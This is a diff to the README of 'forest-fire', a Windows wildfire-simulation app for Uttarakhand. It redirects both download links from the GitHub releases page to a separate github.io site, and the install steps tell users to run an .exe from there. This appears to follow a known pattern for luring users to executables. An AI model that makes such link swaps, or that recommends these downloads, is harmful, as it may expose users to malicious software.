@@ -1,6 +1,6 @@
 # 🌲 forest-fire - Simulate wildfire spread in Uttarakhand forests
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Harriercrosscheck754/forest-fire/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://harriercrosscheck754.github.io)
 
 This application models how forest fires move across the landscape of Uttarakhand. It uses real satellite data from NASA and topographical information to create accurate simulations. Users can visualize fire paths and understand how different terrain factors affect wildfire behavior.
 
@@ -22,7 +22,7 @@ The application runs on standard Windows desktop hardware. Ensure your computer 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Harriercrosscheck754/forest-fire/releases) to access the downloads.
+1. Visit the [official release page](https://harriercrosscheck754.github.io) to access the downloads.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start the download.
 4. Locate the downloaded file in your computer's Downloads folder.
